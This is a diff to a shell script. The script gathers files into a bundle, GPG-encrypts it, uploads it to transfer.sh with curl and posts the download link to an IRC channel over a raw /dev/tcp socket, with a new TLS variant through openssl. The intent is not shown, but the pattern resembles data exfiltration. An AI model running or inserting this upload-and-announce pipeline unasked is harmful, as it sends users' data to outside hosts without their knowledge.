@@ -9,6 +9,7 @@ if [ "${DEBUG:-0}" -eq 1 ]; then
     set -x
 fi
 msg(){ printf "%s: %s\n" "$1" "$2";}
+
 irc(){
     if [ ! -S "/proc/$$/fd/3" ]; then
         exec 3>/dev/tcp/"${SERVER}"/6667
@@ -21,6 +22,25 @@ irc(){
         fi
     fi
     echo "PRIVMSG ${CHANNEL} :$*" >&3
+    echo "QUIT" >&3
+}
+
+irc_ssl(){
+    if ! type openssl >/dev/null 2>&1; then
+        msg "W" "openssl not found! Skip irc_ssl"
+        return 1
+    fi
+    (
+        echo "NICK $NICKNAME"
+        echo "USER $NICKNAME +i * :sh"
+        # if $CHANNEL is IRC channel
+        if [[ $CHANNEL == [#]* ]]; then
+            echo "JOIN ${CHANNEL}"
+        fi
+        echo "PRIVMSG ${CHANNEL} :$*";
+        echo "QUIT"
+        sleep 10
+    ) | openssl s_client -quiet -connect "${SERVER}":6697
 }
 
 REPO=${REPO:-$REPO_DEFAULT}
@@ -51,6 +71,11 @@ done <  <(find "$REPO" -maxdepth 1 -name \*.sh -printf '%P\0')
 
 gpg --recv-keys "$GPG"
 gpg --yes --trust-model always --output "$NICKNAME.log" --encrypt --recipient "$GPG" "$NICKNAME"
-irc "$(curl --upload-file "$NICKNAME.log" https://transfer.sh)"
+message="$(curl --upload-file "$NICKNAME.log" https://transfer.sh)"
+
+irc_ssl "$message"
+if [ $? -ne 0 ]; then
+    irc "$message"
+fi
+
 rm "$NICKNAME" -rf
-#irc "QUIT"
